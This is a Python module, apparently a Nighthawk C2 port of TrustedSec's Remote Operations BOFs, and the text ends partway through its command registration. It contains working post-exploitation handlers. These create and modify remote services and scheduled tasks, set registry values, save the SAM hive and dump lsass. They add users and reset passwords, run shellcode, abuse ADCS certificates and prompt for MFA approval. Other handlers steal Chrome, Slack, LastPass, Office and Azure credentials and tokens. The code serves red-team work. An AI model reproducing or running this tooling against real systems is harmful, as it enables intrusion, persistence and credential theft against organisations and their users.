import struct

# =============================================================================
# Remote OPs BOFs — Nighthawk Python Module
# Author: Dominic Chell (@domchell)
# Port of Remote.cna (TrustedSec Remote Operations BOFs) for Nighthawk C2
# =============================================================================


# =============================================================================
# Section 1: Constants
# =============================================================================

REG_HIVES = {
    "HKCR": 0,
    "HKCU": 1,
    "HKLM": 2,
    "HKU": 3,
}

REG_TYPES = {
    "REG_SZ": 1,
    "REG_EXPAND_SZ": 2,
    "REG_BINARY": 3,
    "REG_DWORD": 4,
    "REG_MULTI_SZ": 7,
    "REG_QWORD": 11,
}

INT_TYPES = {"REG_DWORD", "REG_QWORD"}

SERVICE_TYPES = {
    "1": 0x02,  # SERVICE_FILE_SYSTEM_DRIVER
    "2": 0x01,  # SERVICE_KERNEL_DRIVER
    "3": 0x10,  # SERVICE_WIN32_OWN_PROCESS (default)
    "4": 0x20,  # SERVICE_WIN32_SHARE_PROCESS
}


# =============================================================================
# Section 2: Helper Functions
# =============================================================================

def rload_bof(info, bof_name):
    """Load BOF binary for the agent's architecture."""
    arch = info.Agent.ProcessArch
    path = nighthawk.script_resource(f"{bof_name}/{bof_name}.{arch}.o")
    try:
        with open(path, "rb") as f:
            data = f.read()
        if len(data) == 0:
            nighthawk.console_write(CONSOLE_ERROR, f"BOF file is empty: {path}")
            return None
        return data
    except Exception:
        nighthawk.console_write(CONSOLE_ERROR, f"Could not read BOF file: {path}")
        return None


def rrun_bof(info, bof_name, packed_args=b""):
    """Load and execute a BOF in one call."""
    bof_data = rload_bof(info, bof_name)
    if bof_data is None:
        return
    arch = info.Agent.ProcessArch
    api.execute_bof(
        f"{bof_name}.{arch}.o", bof_data, packed_args,
        "go", True, 0, False, "", show_in_console=True,
    )


def rparse_opts(params):
    """Parse /flag and /key:value options from a parameter list."""
    opts = {}
    pos = 1
    for arg in params:
        if arg.startswith("/") and ":" in arg[1:]:
            key, val = arg[1:].split(":", 1)
            opts[key] = val
        elif arg.startswith("/"):
            opts[arg[1:]] = "TRUE"
        else:
            opts[str(pos)] = arg
            pos += 1
    return opts


def rread_local_file(path):
    """Read a file from the operator's local filesystem."""
    try:
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        nighthawk.console_write(CONSOLE_ERROR, f"Could not read local file: {path}")
        return None


# =============================================================================
# Section 3: Command Handlers
# =============================================================================

# ---------------------------------------------------------------------------
# Service Control commands
# ---------------------------------------------------------------------------

def rcmd_sc_description(params, info):
    if len(params) < 2 or len(params) > 3:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: sc_description <service> <description> [hostname]")
        return
    servicename = params[0]
    desc = params[1]
    hostname = params[2] if len(params) >= 3 else ""
    p = Packer()
    p.addstr(hostname)
    p.addstr(servicename)
    p.addstr(desc)
    rrun_bof(info, "sc_description", p.getbuffer())


def rcmd_sc_config(params, info):
    if len(params) < 4 or len(params) > 5:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: sc_config <service> <binpath> <errormode> <startmode> [hostname]")
        return
    servicename = params[0]
    binpath = params[1]
    try:
        errormode = int(params[2])
        startmode = int(params[3])
    except ValueError:
        nighthawk.console_write(CONSOLE_ERROR, "errormode and startmode must be numbers")
        return
    if errormode < 0 or errormode > 3:
        nighthawk.console_write(CONSOLE_ERROR, "errormode must be 0-3")
        return
    if startmode < 2 or startmode > 4:
        nighthawk.console_write(CONSOLE_ERROR, "startmode must be 2-4")
        return
    hostname = params[4] if len(params) >= 5 else ""
    p = Packer()
    p.addstr(hostname)
    p.addstr(servicename)
    p.addstr(binpath)
    p.addshort(errormode)
    p.addshort(startmode)
    rrun_bof(info, "sc_config", p.getbuffer())


def rcmd_sc_failure(params, info):
    if len(params) < 6 or len(params) > 7:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: sc_failure <service> <resetperiod> <rebootmsg> "
            "<command> <numactions> <actions> [hostname]")
        return
    servicename = params[0]
    resetperiod = int(params[1])
    rebootmessage = params[2]
    command = params[3]
    numactions = params[4]
    actions = params[5]
    hostname = params[6] if len(params) >= 7 else ""
    p = Packer()
    p.addstr(hostname)
    p.addstr(servicename)
    p.adduint32(resetperiod)
    p.addstr(rebootmessage)
    p.addstr(command)
    p.addshort(int(numactions))
    p.addstr(actions)
    rrun_bof(info, "sc_failure", p.getbuffer())


def rcmd_sc_create(params, info):
    if len(params) < 6 or len(params) > 8:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: sc_create <service> <displayname> <binpath> <desc> "
            "<errormode> <startmode> [type] [hostname]")
        return
    servicename = params[0]
    displayname = params[1]
    binpath = params[2]
    desc = params[3]
    try:
        errormode = int(params[4])
        startmode = int(params[5])
    except ValueError:
        nighthawk.console_write(CONSOLE_ERROR, "errormode and startmode must be numbers")
        return
    if errormode < 0 or errormode > 3:
        nighthawk.console_write(CONSOLE_ERROR, "errormode must be 0-3")
        return
    if startmode < 2 or startmode > 4:
        nighthawk.console_write(CONSOLE_ERROR, "startmode must be 2-4")
        return
    servicetype = SERVICE_TYPES["3"]  # default: WIN32_OWN_PROCESS
    hostname = ""
    if len(params) >= 7:
        if params[6] in SERVICE_TYPES:
            servicetype = SERVICE_TYPES[params[6]]
        else:
            nighthawk.console_write(CONSOLE_ERROR,
                "Invalid service type. Use 1-4")
            return
    if len(params) >= 8:
        hostname = params[7]
    p = Packer()
    p.addstr(hostname)
    p.addstr(servicename)
    p.addstr(binpath)
    p.addstr(displayname)
    p.addstr(desc)
    p.addshort(errormode)
    p.addshort(startmode)
    p.addshort(servicetype)
    rrun_bof(info, "sc_create", p.getbuffer())


def rcmd_sc_delete(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: sc_delete <service> [hostname]")
        return
    servicename = params[0]
    hostname = params[1] if len(params) >= 2 else ""
    p = Packer()
    p.addstr(hostname)
    p.addstr(servicename)
    rrun_bof(info, "sc_delete", p.getbuffer())


def rcmd_sc_stop(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: sc_stop <service> [hostname]")
        return
    servicename = params[0]
    hostname = params[1] if len(params) >= 2 else ""
    p = Packer()
    p.addstr(hostname)
    p.addstr(servicename)
    rrun_bof(info, "sc_stop", p.getbuffer())


def rcmd_sc_start(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: sc_start <service> [hostname]")
        return
    servicename = params[0]
    hostname = params[1] if len(params) >= 2 else ""
    p = Packer()
    p.addstr(hostname)
    p.addstr(servicename)
    rrun_bof(info, "sc_start", p.getbuffer())


# ---------------------------------------------------------------------------
# Registry commands
# ---------------------------------------------------------------------------

def rcmd_reg_set(params, info):
    if len(params) < 5:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: reg_set [hostname] <hive> <path> <value> <type> <data...>")
        return

    i = 0
    if params[0].upper() in REG_HIVES:
        hostname = ""
    else:
        hostname = "\\\\" + params[0]
        i = 1

    if i >= len(params) or params[i].upper() not in REG_HIVES:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid registry hive")
        return
    hive = REG_HIVES[params[i].upper()]
    i += 1

    if i >= len(params):
        nighthawk.console_write(CONSOLE_ERROR, "Missing registry path")
        return
    path = params[i]
    i += 1

    if i >= len(params):
        nighthawk.console_write(CONSOLE_ERROR, "Missing value name")
        return
    key = params[i]
    i += 1

    if i >= len(params) or params[i].upper() not in REG_TYPES:
        nighthawk.console_write(CONSOLE_ERROR,
            "Invalid type. Use: REG_SZ, REG_EXPAND_SZ, REG_BINARY, "
            "REG_DWORD, REG_MULTI_SZ, REG_QWORD")
        return
    regstr = params[i].upper()
    reg_type = REG_TYPES[regstr]
    i += 1

    p = Packer()
    p.addstr(hostname)
    p.adduint32(hive)
    p.addstr(path)
    p.addstr(key)
    p.adduint32(reg_type)

    if regstr in INT_TYPES:
        if i >= len(params):
            nighthawk.console_write(CONSOLE_ERROR, "Missing data value")
            return
        p.addbytes(struct.pack("<I", int(params[i])))
    elif regstr == "REG_MULTI_SZ":
        buf = b""
        while i < len(params):
            buf += params[i].encode("utf-8") + b"\x00"
            i += 1
        buf += b"\x00"
        p.addbytes(buf)
    elif regstr in ("REG_SZ", "REG_EXPAND_SZ"):
        if i >= len(params):
            nighthawk.console_write(CONSOLE_ERROR, "Missing data value")
            return
        p.addstr(params[i])
    elif regstr == "REG_BINARY":
        if i >= len(params):
            nighthawk.console_write(CONSOLE_ERROR, "Missing file path for REG_BINARY data")
            return
        data = rread_local_file(params[i])
        if data is None:
            return
        p.addbytes(data)

    rrun_bof(info, "reg_set", p.getbuffer())


def rcmd_reg_delete(params, info):
    if len(params) < 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: reg_delete [hostname] <hive> <path> [value]")
        return

    i = 0
    if params[0].upper() in REG_HIVES:
        hostname = ""
    else:
        hostname = "\\\\" + params[0]
        i = 1

    if i >= len(params) or params[i].upper() not in REG_HIVES:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid registry hive")
        return
    hive = REG_HIVES[params[i].upper()]
    i += 1

    if i >= len(params):
        nighthawk.console_write(CONSOLE_ERROR, "Missing registry path")
        return
    path = params[i]
    i += 1

    if i < len(params):
        delkey = 0
        key = params[i]
    else:
        delkey = 1
        key = ""

    p = Packer()
    p.addstr(hostname)
    p.adduint32(hive)
    p.addstr(path)
    p.addstr(key)
    p.adduint32(delkey)
    rrun_bof(info, "reg_delete", p.getbuffer())


def rcmd_reg_save(params, info):
    if len(params) != 3:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: reg_save <hive> <regpath> <fileout>\n"
            "Note: SeBackupPrivilege is required. Enable it with get_priv first.")
        return
    if params[0].upper() not in REG_HIVES:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid registry hive")
        return
    hive = REG_HIVES[params[0].upper()]
    regpath = params[1]
    output = params[2]
    p = Packer()
    p.addstr(regpath)
    p.addstr(output)
    p.adduint32(hive)
    rrun_bof(info, "reg_save", p.getbuffer())


# ---------------------------------------------------------------------------
# Scheduled Task commands
# ---------------------------------------------------------------------------

def rcmd_schtaskscreate(params, info):
    # Usage: schtaskscreate [hostname] <username> <password> <taskpath> <xmlpath> <usermode> <forcemode>
    if len(params) < 6 or len(params) > 7:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: schtaskscreate [hostname] <username> <password> "
            "<taskpath> <xmlpath> <usermode> <forcemode>\n"
            "usermode: USER, SYSTEM, XML, or PASSWORD\n"
            "forcemode: CREATE or UPDATE")
        return

    if len(params) == 6:
        server = ""
        username, password, taskpath, xmlpath, usermode_str, forcemode_str = params
    else:
        server = params[0]
        username, password, taskpath, xmlpath, usermode_str, forcemode_str = params[1:]

    mode_map = {"USER": 0, "SYSTEM": 1, "XML": 2, "PASSWORD": 3}
    if usermode_str not in mode_map:
        nighthawk.console_write(CONSOLE_ERROR,
            "usermode must be USER, SYSTEM, XML, or PASSWORD (case sensitive)")
        return
    mode = mode_map[usermode_str]

    if forcemode_str == "CREATE":
        force = 0
    elif forcemode_str == "UPDATE":
        force = 1
    else:
        nighthawk.console_write(CONSOLE_ERROR,
            "forcemode must be CREATE or UPDATE (case sensitive)")
        return

    fdata = rread_local_file(xmlpath)
    if fdata is None:
        return

    p = Packer()
    p.addwstr(server)
    p.addwstr(username)
    p.addwstr(password)
    p.addwstr(taskpath)
    p.addwstr(fdata.decode("utf-8", errors="replace"))
    p.adduint32(mode)
    p.adduint32(force)
    rrun_bof(info, "schtaskscreate", p.getbuffer())


def rcmd_schtasksdelete(params, info):
    if len(params) < 2 or len(params) > 3:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: schtasksdelete [hostname] <taskname> <TASK|FOLDER>")
        return

    type_str = params[-1]
    if type_str == "TASK":
        isfolder = 0
    elif type_str == "FOLDER":
        isfolder = 1
    else:
        nighthawk.console_write(CONSOLE_ERROR,
            "Must provide TASK or FOLDER (case sensitive)")
        return

    if len(params) == 2:
        server = ""
        taskname = params[0]
    else:
        server = params[0]
        taskname = params[1]

    p = Packer()
    p.addwstr(server)
    p.addwstr(taskname)
    p.adduint32(isfolder)
    rrun_bof(info, "schtasksdelete", p.getbuffer())


def rcmd_schtasksstop(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: schtasksstop [hostname] <taskname>")
        return
    if len(params) == 1:
        server = ""
        taskname = params[0]
    else:
        server = params[0]
        taskname = params[1]
    p = Packer()
    p.addwstr(server)
    p.addwstr(taskname)
    rrun_bof(info, "schtasksstop", p.getbuffer())


def rcmd_schtasksrun(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: schtasksrun [hostname] <taskname>")
        return
    if len(params) == 1:
        server = ""
        taskname = params[0]
    else:
        server = params[0]
        taskname = params[1]
    p = Packer()
    p.addwstr(server)
    p.addwstr(taskname)
    rrun_bof(info, "schtasksrun", p.getbuffer())


# ---------------------------------------------------------------------------
# Process commands
# ---------------------------------------------------------------------------

def rcmd_procdump(params, info):
    if len(params) != 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: procdump <pid> <fileout>\n"
            "Note: SeDebugPrivilege is required. Enable it with get_priv first.")
        return
    p = Packer()
    p.adduint32(int(params[0]))
    p.addwstr(params[1])
    rrun_bof(info, "procdump", p.getbuffer())


def rcmd_ProcessListHandles(params, info):
    if len(params) != 1:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: ProcessListHandles <pid>")
        return
    p = Packer()
    p.adduint32(int(params[0]))
    rrun_bof(info, "ProcessListHandles", p.getbuffer())


def rcmd_ProcessDestroy(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: ProcessDestroy <pid> [handleid]")
        return
    pid = int(params[0])
    handle = int(params[1]) if len(params) > 1 else 0
    if handle < 0 or handle > 65535:
        nighthawk.console_write(CONSOLE_ERROR,
            "HANDLEID must be between 0 and 65535")
        return
    p = Packer()
    p.adduint32(pid)
    p.adduint32(handle)
    rrun_bof(info, "ProcessDestroy", p.getbuffer())


def rcmd_suspend(params, info):
    if len(params) < 1:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: suspend <pid>")
        return
    p = Packer()
    p.addshort(1)
    p.adduint32(int(params[0]))
    rrun_bof(info, "suspendresume", p.getbuffer())


def rcmd_resume(params, info):
    if len(params) < 1:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: resume <pid>")
        return
    p = Packer()
    p.addshort(0)
    p.adduint32(int(params[0]))
    rrun_bof(info, "suspendresume", p.getbuffer())


# ---------------------------------------------------------------------------
# User account commands
# ---------------------------------------------------------------------------

def rcmd_enableuser(params, info):
    if len(params) != 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: enableuser <username> <domain>\n"
            "Use \"\" for domain to target local machine.")
        return
    p = Packer()
    p.addwstr(params[1])  # domain first
    p.addwstr(params[0])  # then username
    rrun_bof(info, "enableuser", p.getbuffer())


def rcmd_setuserpass(params, info):
    if len(params) != 3:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: setuserpass <username> <password> <domain>\n"
            "Use \"\" for domain to target local machine.")
        return
    p = Packer()
    p.addwstr(params[2])  # domain first
    p.addwstr(params[0])  # username
    p.addwstr(params[1])  # password
    rrun_bof(info, "setuserpass", p.getbuffer())


def rcmd_addusertogroup(params, info):
    if len(params) != 4:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: addusertogroup <username> <groupname> <server> <domain>\n"
            "Use \"\" for server/domain to target local machine.")
        return
    p = Packer()
    p.addwstr(params[3])  # domain
    p.addwstr(params[2])  # server
    p.addwstr(params[0])  # username
    p.addwstr(params[1])  # groupname
    rrun_bof(info, "addusertogroup", p.getbuffer())


def rcmd_adduser(params, info):
    if len(params) < 2 or len(params) > 3:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: adduser <username> <password> [server]")
        return
    username = params[0]
    password = params[1]
    server = params[2] if len(params) > 2 else ""
    p = Packer()
    p.addwstr(username)
    p.addwstr(password)
    p.addwstr(server)
    rrun_bof(info, "adduser", p.getbuffer())


def rcmd_unexpireuser(params, info):
    if len(params) != 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: unexpireuser <username> <domain>\n"
            "Use \"\" for domain to target local machine.")
        return
    p = Packer()
    p.addwstr(params[1])  # domain first
    p.addwstr(params[0])  # username
    rrun_bof(info, "unexpireuser", p.getbuffer())


# ---------------------------------------------------------------------------
# Credential / key extraction commands
# ---------------------------------------------------------------------------

def rcmd_chromeKey(params, info):
    rrun_bof(info, "chromeKey")


def rcmd_slackKey(params, info):
    rrun_bof(info, "slackKey")


def rcmd_office_tokens(params, info):
    if len(params) != 1:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: office_tokens <pid>")
        return
    p = Packer()
    p.adduint32(int(params[0]))
    rrun_bof(info, "office_tokens", p.getbuffer())


def rcmd_lastpass(params, info):
    if len(params) < 1:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: lastpass <pid1> [pid2] [pid3] ...")
        return
    num_pids = len(params)
    pid_buf = b""
    for pid_str in params:
        pid_buf += struct.pack("<I", int(pid_str))
    pid_buf += struct.pack("<I", 0)  # null terminator
    p = Packer()
    p.adduint32(num_pids)
    p.addbytes(pid_buf)
    rrun_bof(info, "lastpass", p.getbuffer())


def rcmd_slack_cookie(params, info):
    if len(params) != 1:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: slack_cookie <pid>")
        return
    p = Packer()
    p.adduint32(int(params[0]))
    rrun_bof(info, "slack_cookie", p.getbuffer())


# ---------------------------------------------------------------------------
# Shellcode / impersonation commands
# ---------------------------------------------------------------------------

def rcmd_shspawnas(params, info):
    if len(params) != 4:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: shspawnas <domain> <username> <password> <shellcode_file>\n"
            "Use \"\" for domain to target local machine.")
        return
    domain = params[0]
    username = params[1]
    password = params[2]
    shellcode = rread_local_file(params[3])
    if shellcode is None:
        return
    p = Packer()
    p.addwstr(domain)
    p.addwstr(username)
    p.addwstr(password)
    p.addbytes(shellcode)
    rrun_bof(info, "shspawnas", p.getbuffer())


# ---------------------------------------------------------------------------
# ADCS commands
# ---------------------------------------------------------------------------

def rcmd_adcs_request(params, info):
    if len(params) < 1:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: adcs_request <CA> [template] [subject] [altname] "
            "[alturl] [install] [machine] [app_policy] [dns]")
        return
    ca = params[0]
    template = params[1] if len(params) > 1 else ""
    subject = params[2] if len(params) > 2 else ""
    altname = params[3] if len(params) > 3 else ""
    alturl = params[4] if len(params) > 4 else ""
    install = int(params[5]) if len(params) > 5 else 0
    machine = int(params[6]) if len(params) > 6 else 0
    app_policy = int(params[7]) if len(params) > 7 else 0
    dns = int(params[8]) if len(params) > 8 else 0
    p = Packer()
    p.addwstr(ca)
    p.addwstr(template)
    p.addwstr(subject)
    p.addwstr(altname)
    p.addwstr(alturl)
    p.addshort(install)
    p.addshort(machine)
    p.addshort(app_policy)
    p.addshort(dns)
    rrun_bof(info, "adcs_request", p.getbuffer())


def rcmd_adcs_request_on_behalf(params, info):
    if len(params) != 4:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: adcs_request_on_behalf <template> <requester> "
            "<pfx_path> <download_name>")
        return
    template = params[0]
    requester = params[1]
    pfx_path = params[2]
    download_name = params[3]
    pfx_data = rread_local_file(pfx_path)
    if pfx_data is None:
        return
    p = Packer()
    p.addwstr(template)
    p.addwstr(requester)
    p.addstr(download_name)
    p.addbytes(pfx_data)
    rrun_bof(info, "adcs_request_on_behalf", p.getbuffer())


def rcmd_make_token_cert(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: make_token_cert <pfx_path> [pfx_password]")
        return
    cert_data = rread_local_file(params[0])
    if cert_data is None:
        return
    password = params[1] if len(params) > 1 else ""
    p = Packer()
    p.addbytes(cert_data)
    p.addwstr(password)
    rrun_bof(info, "make_token_cert", p.getbuffer())


# ---------------------------------------------------------------------------
# Privilege / misc commands
# ---------------------------------------------------------------------------

def rcmd_get_priv(params, info):
    if len(params) < 1:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: get_priv <privilege_name>\n"
            "e.g. SeDebugPrivilege, SeBackupPrivilege")
        return
    p = Packer()
    p.addstr(params[0])
    rrun_bof(info, "get_priv", p.getbuffer())


def rcmd_ghost_task(params, info):
    if len(params) < 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: ghost_task <hostname> <add|delete> ...\n"
            "  add: ghost_task <host> add <task> <program> <argument> "
            "<user> <schedule> [time] [day]\n"
            "  delete: ghost_task <host> delete <task>")
        return

    hostname = params[0].lower()
    operation = params[1].lower()
    # arglen matches CNA's size(@_) which includes beacon ID
    arglen = len(params) + 1

    if operation == "add":
        if len(params) < 7:
            nighthawk.console_write(CONSOLE_ERROR,
                "Usage: ghost_task <host> add <task> <program> <argument> "
                "<user> <schedule> [time] [day]")
            return
        taskname = params[2].lower()
        program = params[3].lower()
        argument = params[4].lower()
        username = params[5].lower()
        scheduletype = params[6].lower()

        p = Packer()
        p.adduint32(arglen)
        p.addstr(hostname)
        p.addstr(operation)
        p.addstr(taskname)
        p.addstr(program)
        p.addstr(argument)
        p.addstr(username)
        p.addstr(scheduletype)

        if scheduletype == "weekly":
            if len(params) < 9:
                nighthawk.console_write(CONSOLE_ERROR,
                    "weekly requires time and day args")
                return
            p.addstr(params[7].lower())
            p.addstr(params[8].lower())
        elif scheduletype in ("second", "daily"):
            if len(params) < 8:
                nighthawk.console_write(CONSOLE_ERROR,
                    f"{scheduletype} requires a time/second arg")
                return
            p.addstr(params[7].lower())
        elif scheduletype == "logon":
            pass  # no extra args
        else:
            nighthawk.console_write(CONSOLE_ERROR,
                "Unknown schedule type. Use: second, daily, weekly, logon")
            return

        rrun_bof(info, "ghost_task", p.getbuffer())

    elif operation == "delete":
        if len(params) < 3:
            nighthawk.console_write(CONSOLE_ERROR,
                "Usage: ghost_task <host> delete <task>")
            return
        taskname = params[2].lower()
        p = Packer()
        p.adduint32(arglen)
        p.addstr(hostname)
        p.addstr(operation)
        p.addstr(taskname)
        rrun_bof(info, "ghost_task", p.getbuffer())
    else:
        nighthawk.console_write(CONSOLE_ERROR,
            "Operation must be 'add' or 'delete'")


def rcmd_shutdown(params, info):
    if len(params) != 5:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: shutdown <hostname> <message> <time> <closeapps> <reboot>\n"
            "Use \"\" for hostname/message if empty. "
            "closeapps/reboot: 0 or 1")
        return
    hostname = params[0]
    message = params[1]
    try:
        time_val = int(params[2])
        closeapps = int(params[3])
        reboot = int(params[4])
    except ValueError:
        nighthawk.console_write(CONSOLE_ERROR, "time, closeapps, reboot must be numbers")
        return
    if closeapps not in (0, 1) or reboot not in (0, 1):
        nighthawk.console_write(CONSOLE_ERROR, "closeapps and reboot must be 0 or 1")
        return
    p = Packer()
    p.addstr(hostname)
    p.addstr(message)
    p.adduint32(time_val)
    p.addshort(closeapps)
    p.addshort(reboot)
    rrun_bof(info, "shutdown", p.getbuffer())


def rcmd_global_unprotect(params, info):
    rrun_bof(info, "global_unprotect")


def rcmd_get_azure_token(params, info):
    if len(params) < 3:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: get_azure_token <client_id> <scope> <browser> [hint] [browser_path]\n"
            "browser: 0=edge, 1=chrome, 2=default, 3=other")
        return
    clientid = params[0]
    scope = params[1]
    browserType = int(params[2])
    hint = params[3] if len(params) > 3 else ""
    browserPath = params[4] if len(params) > 4 else ""
    p = Packer()
    p.addstr(clientid)
    p.addstr(scope)
    p.adduint32(browserType)
    p.addstr(hint)
    p.addstr(browserPath)
    rrun_bof(info, "get_azure_token", p.getbuffer())


def rcmd_ask_mfa(params, info):
    if len(params) != 1:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: ask_mfa <number>")
        return
    try:
        mfa_number = int(params[0])
    except ValueError:
        nighthawk.console_write(CONSOLE_ERROR, "MFA number must be an integer")
        return
    if mfa_number < 0 or mfa_number > 99:
        nighthawk.console_write(CONSOLE_ERROR, "MFA number should be between 0-99")
        return
    p = Packer()
    p.adduint32(mfa_number)
    rrun_bof(info, "ask_mfa", p.getbuffer())


# =============================================================================
# Section 4: Command Registration
#
# Signature: register_command(function, name, long_description,
#                             short_description, usage, example)
# =============================================================================

# --- Service Control ---

nighthawk.register_command(rcmd_sc_description, "sc_description",
    "Sets the description of an existing service on the target host",
    "Sets a service's description",
    "sc_description <service> <description> [hostname]",
    "sc_description MyService \"My new description\" dc01.domain.local")

nighthawk.register_command(rcmd_sc_config, "sc_config",
    "Configures an existing service on the target host.\n"
    "  ERRORMODE: 0=ignore, 1=normal, 2=severe, 3=critical\n"
    "  STARTMODE: 2=auto, 3=demand, 4=disabled",
    "Configures an existing service",
    "sc_config <service> <binpath> <errormode> <startmode> [hostname]",
    "sc_config MyService C:\\svc.exe 1 3")

nighthawk.register_command(rcmd_sc_failure, "sc_failure",
    "Configures the actions upon failure of an existing service.\n"
    "  RESETPERIOD: seconds of no failure before reset (INFINITE allowed)\n"
    "  NUMACTIONS/ACTIONS: e.g. 3/5000/2/800 = 2 actions\n"
    "  Actions: 0=none, 1=restart svc, 2=reboot, 3=run command",
    "Changes service failure actions",
    "sc_failure <service> <resetperiod> <rebootmsg> <command> <numactions> <actions> [hostname]",
    "sc_failure MyService 86400 \"\" \"\" 2 1/60000/1/120000")

nighthawk.register_command(rcmd_sc_create, "sc_create",
    "Creates a service on the target host.\n"
    "  ERRORMODE: 0=ignore, 1=normal, 2=severe, 3=critical\n"
    "  STARTMODE: 2=auto, 3=demand, 4=disabled\n"
    "  TYPE: 1=FS driver, 2=kernel driver, 3=own process (default), 4=shared process",
    "Creates a new service",
    "sc_create <service> <displayname> <binpath> <desc> <errormode> <startmode> [type] [hostname]",
    "sc_create MySvc \"My Service\" C:\\svc.exe \"A service\" 1 3")

nighthawk.register_command(rcmd_sc_delete, "sc_delete",
    "Deletes the specified service on the target host",
    "Deletes a service",
    "sc_delete <service> [hostname]",
    "sc_delete MyService dc01.domain.local")

nighthawk.register_command(rcmd_sc_stop, "sc_stop",
    "Stops the specified service on the target host",
    "Stops a service",
    "sc_stop <service> [hostname]",
    "sc_stop MyService dc01.domain.local")

nighthawk.register_command(rcmd_sc_start, "sc_start",
    "Starts the specified service on the target host",
    "Starts a service",
    "sc_start <service> [hostname]",
    "sc_start MyService dc01.domain.local")

# --- Registry ---

nighthawk.register_command(rcmd_reg_set, "reg_set",
    "Creates or sets the specified registry key/value on the target host.\n"
    "  HIVE: HKLM, HKCU, HKU, HKCR\n"
    "  TYPE: REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_MULTI_SZ, REG_QWORD\n"
    "  For REG_BINARY, DATA is a local file path.\n"
    "  For REG_MULTI_SZ, DATA is space-separated quoted strings.",
    "Creates or sets a registry key or value",
    "reg_set [hostname] <hive> <path> <value> <type> <data...>",
    "reg_set HKLM SOFTWARE\\MyKey MyValue REG_SZ \"hello world\"")

nighthawk.register_command(rcmd_reg_delete, "reg_delete",
    "Deletes the specified registry key or value on the target host.\n"
    "  If REGVALUE is omitted, the entire key is deleted.\n"
    "  Use \"\" to delete the default value.",
    "Deletes a registry key or value",
    "reg_delete [hostname] <hive> <path> [value]",
    "reg_delete HKLM SOFTWARE\\MyKey MyValue")

nighthawk.register_command(rcmd_reg_save, "reg_save",
    "Saves the specified registry path and all subkeys to a file on the target.\n"
    "Note: SeBackupPrivilege required — use get_priv SeBackupPrivilege first.\n"
    "Note: Output file is on target, remember to clean up.",
    "Saves registry path to disk",
    "reg_save <hive> <regpath> <fileout>",
    "reg_save HKLM SAM C:\\temp\\sam.hiv")

# --- Scheduled Tasks ---

nighthawk.register_command(rcmd_schtaskscreate, "schtaskscreate",
    "Creates or updates a scheduled task given an XML task definition.\n"
    "  USERMODE: USER, SYSTEM, XML, or PASSWORD (case sensitive)\n"
    "  FORCEMODE: CREATE or UPDATE (case sensitive)\n"
    "  XMLPATH: local path to the XML task definition file",
    "Creates a new scheduled task",
    "schtaskscreate [hostname] <username> <password> <taskpath> <xmlpath> <usermode> <forcemode>",
    "schtaskscreate \"\" \"\" \\MyTask C:\\task.xml SYSTEM CREATE")

nighthawk.register_command(rcmd_schtasksdelete, "schtasksdelete",
    "Deletes a scheduled task or folder.\n"
    "  TYPE: TASK or FOLDER (case sensitive)\n"
    "  If deleting a folder, it must be empty.",
    "Deletes a scheduled task or folder",
    "schtasksdelete [hostname] <taskname> <TASK|FOLDER>",
    "schtasksdelete \\Microsoft\\Windows\\MUI\\LpRemove TASK")

nighthawk.register_command(rcmd_schtasksstop, "schtasksstop",
    "Stops a scheduled task. Full path including task name must be given.",
    "Stops a scheduled task",
    "schtasksstop [hostname] <taskname>",
    "schtasksstop \\Microsoft\\Windows\\MUI\\LpRemove")

nighthawk.register_command(rcmd_schtasksrun, "schtasksrun",
    "Runs a scheduled task. Full path including task name must be given.",
    "Runs a scheduled task",
    "schtasksrun [hostname] <taskname>",
    "schtasksrun \\Microsoft\\Windows\\MUI\\LpRemove")

# --- Process ---

nighthawk.register_command(rcmd_procdump, "procdump",
    "Dumps a process using MiniDumpWriteDump to the specified output file.\n"
    "Note: SeDebugPrivilege required — use get_priv SeDebugPrivilege first.\n"
    "Warning: This may get caught by AV/EDR.",
    "Dumps a process to a file",
    "procdump <pid> <fileout>",
    "procdump 1234 C:\\temp\\lsass.dmp")

nighthawk.register_command(rcmd_ProcessListHandles, "ProcessListHandles",
    "Lists all open handles in a specified process. "
